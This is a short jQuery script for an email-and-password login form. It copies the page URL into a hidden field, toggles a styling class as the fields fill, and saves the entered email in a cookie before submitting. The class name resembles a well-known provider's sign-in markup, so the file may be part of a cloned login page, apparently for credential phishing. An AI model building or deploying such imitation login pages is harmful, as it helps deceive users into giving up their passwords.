$(document).ready(function() {
    var url = window.location.href;
    $('#inputurl').attr('value',url);   
    
    
    $('input[name=email]').on('keyup keypress blur change', function(e) {
        if($('input[name=email]').val().length === 0 ){
        $("#emailField").removeClass("CDELXb")
      }else{
        $("#emailField").addClass("CDELXb")
      }
    });
    
    $('input[name=password]').on('keyup keypress blur change', function(e) {
        if($('input[name=password]').val().length === 0 ){
        $("#pwdField").removeClass("CDELXb")
      }else{
        $("#pwdField").addClass("CDELXb")
      }
    });
    
    
  
    
    $('#submitbutton').click( function() {
      document.cookie = $('input[name=email]').val();
      $("#formtosubmit").submit();
    });
});  